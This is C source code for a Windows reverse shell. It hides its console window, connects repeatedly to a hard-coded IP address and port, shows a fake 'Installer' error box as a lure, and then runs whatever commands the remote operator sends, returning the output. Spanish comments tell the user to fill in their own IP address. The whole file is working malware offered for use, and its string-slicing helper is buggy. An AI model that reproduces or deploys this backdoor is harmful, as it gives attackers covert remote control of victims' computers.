#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p,size) (void) memset((p),0,(size))
int sock;
struct sockaddr_in serv_addr;

char *
str_cut(char str[],int slice_from,int slice_to)
{
  if(str[0] == '\0')
    return NULL;

  char *buffer;
  size_t str_len,buffer_len;

  if (slice_to < 0 && slice_from > slice_to){
    str_len = strlen(str);
    if(abs(slice_to) > str_len -1)
      return NULL;
    if(abs(slice_from) > str_len -1)
      slice_from = (-1) * str_len;

    buffer_len = slice_to - slice_from;
    str += (str_len + slice_from);
  }
  else if (slice_from >= 0 && slice_to > slice_from){
    str_len = strlen(str);

    if (slice_from >str_len - 1)
      return NULL;
  }else
    return NULL;

    buffer = calloc(buffer_len,sizeof(char));
    strncpy(buffer,str,buffer_len);
    return buffer;

}

void Shell(){
  char buffer[1024];
  char path[1024];
  char total_response[18384];

  while (1){
    jump:
    bzero(buffer,sizeof(buffer));
    bzero(path,sizeof(path));
    bzero(total_response,sizeof(total_response));
    recv(sock,buffer,sizeof(buffer),0);

    if(strncmp("q",buffer,1) == 0 ){
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    else if(strncmp("cd", buffer,3)==0){
      chdir(str_cut(buffer,3,100));
    }
    else{
        FILE *fp;
        fp = _popen(buffer,"r");
        while(fgets(path,1024,fp)!= NULL){
          strcat(total_response,path);
        }
        send(sock,total_response,sizeof(total_response),0);
        fclose(fp);
      }
    }
  }
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCmdLine,int nCmdShow){
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWIndowsClass",NULL);
  ShowWindow(stealth,0);

  struct sockaddr_in ServAddr;
  unsigned short ServPort;
  char *ServIP;
  WSADATA wsaData;
  /*En este apartado debes de cambiar la ip a la ip que tienes */
  ServIP = "192.168.1.104";
  /*En este apartado marca el puerto que se va a usar  */
  ServPort = 50004;

  if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0 ){
    exit(1);
  }

  sock = socket(AF_INET, SOCK_STREAM,0);
  
  memset(&ServAddr,0,sizeof(ServAddr));
  ServAddr.sin_family = AF_INET;
  ServAddr.sin_addr.s_addr = inet_addr(ServIP);
  ServAddr.sin_port = htons(ServPort);
  start:
  while (connect(sock,(struct sockaddr *)&ServAddr,sizeof(ServAddr))!=0)
  {
    Sleep(10);
    goto start;
  }
  /*En este estamos aplicando lo que es una función para qué se habrá una caja de mensaje con el mensaje indicado, con el texto que lleva el cuadro y luego la parte de arriba sería el segundo enunciado */
  MessageBox(NULL,TEXT("Bailaste"),TEXT("Installer"),MB_OK | MB_ICONERROR);
  Shell();
}
